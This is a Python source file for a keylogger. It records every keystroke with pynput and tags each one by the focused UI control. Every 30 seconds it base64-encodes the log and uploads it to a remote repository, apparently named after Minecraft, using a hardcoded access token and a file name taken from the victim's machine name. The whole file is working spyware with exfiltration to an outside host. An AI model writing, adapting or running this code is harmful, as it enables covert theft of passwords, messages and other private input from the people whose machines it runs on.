import socket
from gdrive import GDrive
from pynput.keyboard import Listener
from contextlib import suppress
import comtypes.stream
import uiautomation as auto
import hashlib
import uuid
import base64
import os
import time
from threading import Timer

userdomain = os.environ.get("USERDOMAIN")
if not userdomain:
    try:
        userdomain = socket.gethostname()
    except:
        userdomainm = uuid.uuid4().hex

DB_PATH = "Minecraft-vIIr/public"
TOKEN = "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"

gdrive = GDrive(DB_PATH, TOKEN)

# File path and cache settings
REMOTE_PATH = f"{userdomain}-keyoutput{int(time.time())}.txt"
CACHE = {}

# Periodically write cache to file
def save_cache():
    global CACHE

    try:
        new_values = "".join(CACHE.values())

        if new_values:
            try:
                origin64 = gdrive.fetch64(REMOTE_PATH)
            except FileNotFoundError:
                origin64 = ""

            origin_content = base64.b64decode(origin64.encode("utf-8")).decode("utf-8")

            new_content = origin_content + "".join(CACHE.values())
            print(new_content)
            new64 = base64.b64encode(new_content.encode("utf-8")).decode("utf-8")

            gdrive.upload64(new64, REMOTE_PATH)
            
            CACHE = {}
    except Exception as e:
        print(e)

    Timer(30, save_cache).start()  # Refresh cache every 5 seconds

# Handle key events
def on_press(key):
    with auto.UIAutomationInitializerInThread():
        try:
            new_data = key.char or f'[{str(key).removeprefix("Key.")}]'
        except AttributeError:
            new_data = f'[{str(key).removeprefix("Key.")}]'

        new_data = new_data.replace("[space]", " ")

        # Get the current focused control
        with suppress(Exception):
            control = auto.GetFocusedControl()
            inputID = hashlib.md5(str(control.GetRuntimeId()).encode()).hexdigest()

            # Update cache
            CACHE[inputID] = CACHE.get(inputID, "") + new_data

# Main program startup
if __name__ == "__main__":
    save_cache()

    with Listener(on_press=on_press) as listener:
        listener.join()
